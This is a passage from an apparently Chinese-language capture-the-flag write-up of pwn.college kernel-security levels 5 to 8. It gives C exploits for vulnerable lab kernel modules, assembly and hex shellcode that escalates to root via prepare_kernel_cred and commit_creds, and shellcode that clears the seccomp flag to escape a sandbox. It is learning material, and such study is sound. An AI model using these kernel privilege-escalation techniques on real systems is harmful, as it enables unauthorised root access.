class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;ayftgqtvlhllbakz&quot;</span>;<br>    ioctl(fd,<span class="hljs-number">1337</span>,key);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h3><p>执行参数中的函数指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">device_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a2, <span class="hljs-type">void</span> (*a3)(<span class="hljs-type">void</span>))</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  printk(&amp;unk_618, a1, a2, a3);<br>  result = <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">1337</span> )<br>  &#123;<br>    a3(); <span class="hljs-comment">//call</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>正好win函数最后一个函数是通过jmp调用的，如果传入的a3是win函数的地址，提权完成后执行到<code>commit_creds</code>函数中的ret时可以返回到<code>device_ioctl</code>，使执行流恢复正常。那么考虑如何获取win函数的地址即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text.unlikely:00000000000005AD                               ; __int64 __fastcall win(__int64, __int64, __int64, __int64)<br>.text.unlikely:00000000000005AD                               win proc near<br>.text.unlikely:00000000000005AD 48 C7 C7 48 06 00 00          mov     rdi, offset unk_648<br>.text.unlikely:00000000000005B4 E8 DF 08 00 00                call    printk                          ; PIC mode<br>.text.unlikely:00000000000005B4<br>.text.unlikely:00000000000005B9 31 FF                         xor     edi, edi<br>.text.unlikely:00000000000005BB E8 F0 08 00 00                call    prepare_kernel_cred             ; PIC mode<br>.text.unlikely:00000000000005BB<br>.text.unlikely:00000000000005C0 48 89 C7                      mov     rdi, rax<br>.text.unlikely:00000000000005C3 E9 E0 08 00 00                jmp     commit_creds                    ; PIC mode<br></code></pre></td></tr></table></figure><p>二进制文件中只有函数在代码段中相对基址的偏移，接下来寻找该模块的代码段加载基址。</p><p>未开启kaslr，因此在同一套仿真环境中，内核中.text代码段加载基址是相同的，一般来说是<code>0xffffffff81000000</code>，原因可参考<a href="https://zhuanlan.zhihu.com/p/578569516">Linux物理内存映射</a>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">vm logs | grep kaslr</span><br>[    0.000000] Command line: rw rootfstype=9p rootflags=trans=virtio console=ttyS0 init=/opt/pwn.college/vm/init nokaslr<br>[    0.477623] Kernel command line: rw rootfstype=9p rootflags=trans=virtio console=ttyS0 init=/opt/pwn.college/vm/init nokaslr<br></code></pre></td></tr></table></figure><p>可通过<code>cat /proc/kallsyms | grep _text</code>命令验证基址，因为<code>_text</code>符号就标记了.text段基址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@vm_practice~kernel-security~level5-0:~# cat /proc/kallsyms | grep _text<br>ffffffff81000000 T _text<br>ffffffff81023880 t __text_poke<br>ffffffff81023f90 T alternatives_text_reserved<br>...<br></code></pre></td></tr></table></figure><p>但是这并不是模块中代码段的加载基址，特定模块的加载基址可以通过<code>cat /sys/module/模块名称/sections/.text</code>命令获得</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@vm_practice~kernel-security~level5-0:~# cat /sys/module/challenge/sections/.text<br>0xffffffffc0000000<br></code></pre></td></tr></table></figure><p>那么通过基址+偏移可算得<code>win</code>函数地址为<code>0xffffffffc00005ad</code></p><p>内核模块载入后其符号也会导入，因此也可以通过<code>/proc/kallsyms</code>获取<code>win</code>函数地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@vm_practice~kernel-security~level5-0:~# cat /proc/kallsyms | grep win<br>...<br>ffffffffc00005ad t win  [challenge]<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> win =  <span class="hljs-number">0xffffffffc00005ad</span>;<br>    ioctl(fd,<span class="hljs-number">1337</span>,win);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h3><p>同level5.0，<code>win</code>函数偏移改变了，基址没变，改下偏移即可</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> win =  <span class="hljs-number">0xffffffffc0000872</span>;<br>    ioctl(fd,<span class="hljs-number">1337</span>,win);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level6-0-amp-level6-1"><a href="#level6-0-amp-level6-1" class="headerlink" title="level6.0 &amp; level6.1"></a>level6.0 &amp; level6.1</h3><p>编写shellcode进行cred提权</p><p>在<code>practice mode</code>通过<code>/proc/kallsyms</code>获取符号地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@vm_practice~kernel-security~level6-0:~# cat /proc/kallsyms | grep prepare_kernel_cred<br>ffffffff810890d0 T prepare_kernel_cred<br>root@vm_practice~kernel-security~level6-0:~# cat /proc/kallsyms | grep commit_creds<br>ffffffff81088d90 T commit_creds<br></code></pre></td></tr></table></figure><p> 编写shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">.intel_syntax noprefix<br><br>.section .text<br>.global _start<br>_start:<br>    xor rdi,rdi<br>    mov rcx,0xffffffff810890d0  #prepare_kernel_cred<br>    call rcx<br>    mov rdi,rax<br>    mov rcx,0xffffffff81088d90  #commit_creds<br>    call rcx<br>    ret<br></code></pre></td></tr></table></figure><p>编译后提取16进制shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -c cred.s -o cred -masm=intel -nostdlib -Ttext=0<br>./bin2shellcode cred<br>\x48\x31\xff\x48\xc7\xc1\xd0\x90\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x90\x8d\x08\x81\xff\xd1\xc3<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;\x48\x31\xff\x48\xc7\xc1\xd0\x90\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x90\x8d\x08\x81\xff\xd1\xc3&quot;</span>;<br>    write(fd,shellcode,<span class="hljs-built_in">strlen</span>(shellcode));<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level7-0-amp-level7-1"><a href="#level7-0-amp-level7-1" class="headerlink" title="level7.0 &amp; level7.1"></a>level7.0 &amp; level7.1</h3><p>ioctl交互，操作码1337，参数a3的结构为:8字节的shellcode长度、长度为0x1000的shellcode缓冲区、8字节的shellcode地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">shellcode = _vmalloc(<span class="hljs-number">4096LL</span>, <span class="hljs-number">0xCC0</span>LL, _default_kernel_pte_mask &amp; <span class="hljs-number">0x163</span>);<br><br><span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">1337</span> )<br>  &#123;<br>    copy_from_user(&amp;v5, a3, <span class="hljs-number">8LL</span>);<br>    copy_from_user(v6, a3 + <span class="hljs-number">0x1008</span>, <span class="hljs-number">8LL</span>);<br>    result = <span class="hljs-number">-2LL</span>;<br>    <span class="hljs-keyword">if</span> ( v5 &lt;= <span class="hljs-number">0x1000</span> )<br>    &#123;<br>      copy_from_user(shellcode, a3 + <span class="hljs-number">8</span>, v5);<br>      ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))v6[<span class="hljs-number">0</span>])();<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>shellcode的地址是vmalloc申请的，vmalloc申请内存的基址为<code>VMALLOC_START</code>，偏移作为<code>_vmalloc</code>函数的返回值存放在bss段上的shellcode变量中。</p><p>获取bss段的shellcode变量地址：模块bss段加载基址+bss段内偏移</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@vm_practice~kernel-security~level7-0:~# cat /sys/module/challenge/sections/.bss<br>0xffffffffc0002440<br><span class="hljs-meta prompt_">#</span><span class="language-bash">sc_addr = (E88-E80) + 0xffffffffc0002440 = 0xffffffffc0002448</span><br></code></pre></td></tr></table></figure><p>gdb调试内核得到bss段上shellcode变量的值为0x85000</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) b *0xffffffffc00005ac<br>Note: breakpoint 1 also set at pc 0xffffffffc00005ac.<br>Breakpoint 2 at 0xffffffffc00005ac<br>(gdb) c<br>Continuing.<br><br>Thread 1 hit Breakpoint 1, 0xffffffffc00005ac in ?? ()<br>1: x/5i $rip<br>=&gt; 0xffffffffc00005ac:  push   %rbp<br>   0xffffffffc00005ad:  mov    %rdx,%rcx<br>   0xffffffffc00005b0:  mov    %esi,%ebp<br>   0xffffffffc00005b2:  push   %rbx<br>   0xffffffffc00005b3:  mov    %rdx,%rbx<br>(gdb) b *0xffffffffc0000621<br>Breakpoint 3 at 0xffffffffc0000621<br>(gdb) c<br>Continuing.<br><br>Thread 1 hit Breakpoint 3, 0xffffffffc0000621 in ?? ()<br>1: x/5i $rip<br>=&gt; 0xffffffffc0000621:  mov    0x1e20(%rip),%rdi        # 0xffffffffc0002448<br>   0xffffffffc0000628:  lea    0x8(%rbx),%rsi<br>   0xffffffffc000062c:  callq  0xffffffff813ac640 &lt;_copy_from_user&gt;<br>   0xffffffffc0000631:  mov    0x8(%rsp),%rax<br>   0xffffffffc0000636:  callq  0xffffffff81e00ea0 &lt;__x86_indirect_thunk_rax&gt;<br>(gdb) p/x 0xffffffffc0002448<br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = 0xffffffffc0002448</span><br>(gdb) p/x *0xffffffffc0002448<br><span class="hljs-meta prompt_">$</span><span class="language-bash">2 = 0x85000</span><br></code></pre></td></tr></table></figure><p><code>VMALLOC_START</code>可以在linux内核源码<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/pgtable_64_types.h#L124"><code>/arch/x86/include/asm/pgtable_64_types.h</code></a>中获取。</p><p>在不开启<code>kASLR</code>的情况下<code>VMALLOC_START</code>固定为<code>0xffffc90000000000</code>;</p><p>开启kASLR时，<code>CONFIG_DYNAMIC_MEMORY_LAYOUT</code>值为1，<code>VMALLOC_START</code>随机化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __VMALLOC_BASE_L40xffffc90000000000UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __VMALLOC_BASE_L5 0xffa0000000000000UL</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VMALLOC_SIZE_TB_L432UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VMALLOC_SIZE_TB_L512800UL</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __VMEMMAP_BASE_L40xffffea0000000000UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __VMEMMAP_BASE_L50xffd4000000000000UL</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DYNAMIC_MEMORY_LAYOUT</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMALLOC_STARTvmalloc_base</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMALLOC_SIZE_TB(pgtable_l5_enabled() ? VMALLOC_SIZE_TB_L5 : VMALLOC_SIZE_TB_L4)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMEMMAP_STARTvmemmap_base</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMALLOC_START__VMALLOC_BASE_L4</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMALLOC_SIZE_TBVMALLOC_SIZE_TB_L4</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMEMMAP_START__VMEMMAP_BASE_L4</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_DYNAMIC_MEMORY_LAYOUT */</span></span><br></code></pre></td></tr></table></figure><p>计算得到shellcode地址为：<code>0xffffc90000085000 = 0xffffc90000000000 + 0x85000</code></p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>+<span class="hljs-number">8</span>+<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> sc[] = <span class="hljs-string">&quot;\x48\x31\xff\x48\xc7\xc1\xd0\x90\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x90\x8d\x08\x81\xff\xd1\xc3&quot;</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> length = <span class="hljs-built_in">strlen</span>(sc);<br>    <span class="hljs-type">void</span> *sc_addr = <span class="hljs-number">0xffffc90000085000</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(buf,&amp;length,<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf+<span class="hljs-number">8</span>,sc,length);<br>    <span class="hljs-built_in">memcpy</span>(buf+<span class="hljs-number">0x1008</span>,&amp;sc_addr,<span class="hljs-number">8</span>);<br><br>    ioctl(fd,<span class="hljs-number">1337</span>,buf);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level8-0-amp-level8-1"><a href="#level8-0-amp-level8-1" class="headerlink" title="level8.0 &amp; level8.1"></a>level8.0 &amp; level8.1</h3><p>创建设备文件时<code>proc_create</code>函数的第二个参数由438变为了384，设备文件仅root用户可访问。<code>/challenge</code>还有一个设置了<code>suid</code>位的<code>babykernel_level8.0</code>文件，只能通过该用户态程序访问设备文件。</p><p> 用户态程序中开启了沙箱，只允许使用<code>write</code>。然后执行用户态shellcode。</p><p>用户态shellcode需要做以下事情：</p><ul><li>通过write和设备文件交互，传入用于cred提权和seccomp沙箱逃逸的内核态shellcode</li><li>在用户态读取flag并输出</li></ul><p>首先编写内核shellcode</p><p>在前文<code>Writing Kernel Shellcode</code>一节中我们发现由于<code>gs</code>和<code>fs</code>在段寄存器中的特殊性，通过反汇编自定义代码构建的内核模块寻找<code>thread_info-&gt;flags</code>成员在<code>task_struct</code>中偏移的方式并不可取，甚至<code>gs</code>寄存器中存放的都不是<code>current_task_struct</code>的真实偏移。</p><ul><li>寻找<code>current</code>真实偏移</li></ul><p>我们需要寻找内核中包含寻址<code>current</code>操作的函数，在gdb中查看其汇编来寻找当前进程的<code>task_struct</code>的真实偏移。</p><p><code>uname -r</code>确定内核版本为<code>5.4.0</code></p><p>在5.4.0的源码中搜索<code>current</code>，找到包含寻址<code>current</code>操作的函数，例如<a href="/kernel/cred.c">&#x2F;kernel&#x2F;cred.c</a>中的<code>revert_creds</code>、<code>override_creds</code>、<code>commmit_creds</code>等函数，在gdb中使用<code>disas</code>命令查看其汇编，即可找到<code>current</code>的真实地址。如下，<code>current</code>的真实地址为<code>gs:0x15d00</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) disas commit_creds<br>Dump of assembler code for function commit_creds:<br>   0xffffffff81088d90 &lt;+0&gt;:     push   %r12<br>   0xffffffff81088d92 &lt;+2&gt;:     mov    %gs:0x15d00,%r12<br></code></pre></td></tr></table></figure><ul><li>寻找<code>thread_info-&gt;flags</code>在<code>current</code>中的偏移</li></ul><p><code>p &amp;(((struct task_struct*)0)-&gt;thread_info)</code>查看<code>thread_info</code>成员在<code>task_struct</code>结构体中的偏移，也可以这样查看其它结构体中成员的偏移。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) p &amp;(((struct task_struct*)0)-&gt;thread_info)<br><span class="hljs-meta prompt_">$</span><span class="language-bash">4 = (struct thread_info *) 0x0 &lt;fixed_percpu_data&gt;</span><br>(gdb) p &amp;(((struct thread_info*)0)-&gt;flags)<br><span class="hljs-meta prompt_">$</span><span class="language-bash">6 = (unsigned long *) 0x0 &lt;fixed_percpu_data&gt;</span><br></code></pre></td></tr></table></figure><p>或者<code>ptype</code>查看结构体构造。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) ptype struct task_struct<br>type = struct task_struct &#123;<br>    struct thread_info thread_info;<br>    volatile long state;<br>...<br>(gdb) ptype struct thread_info<br>type = struct thread_info &#123;<br>    unsigned long flags;<br>    u32 status;<br>&#125;    <br></code></pre></td></tr></table></figure><p>可以发现<code>thread_info-&gt;flags</code>成员就在<code>task_struct</code>结构体的首地址，那么<code>flags</code>成员的地址即<code>gs:0x15d00</code>。</p><p>内核态shellcode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asm">.intel_syntax noprefix<br><br>.section .text<br>.global _start<br>_start:<br>    xor rdi,rdi<br>    mov rcx,0xffffffff810890d0  #prepare_kernel_cred<br>    call rcx<br>    mov rdi,rax<br>    mov rcx,0xffffffff81088d90  #commit_creds<br>    call rcx<br>    <br>    mov    rax,QWORD PTR gs:0x15d00<br>    and    QWORD PTR [rax],0xfffffffffffffeff<br>    xor    eax,eax<br>    <br>    ret<br> 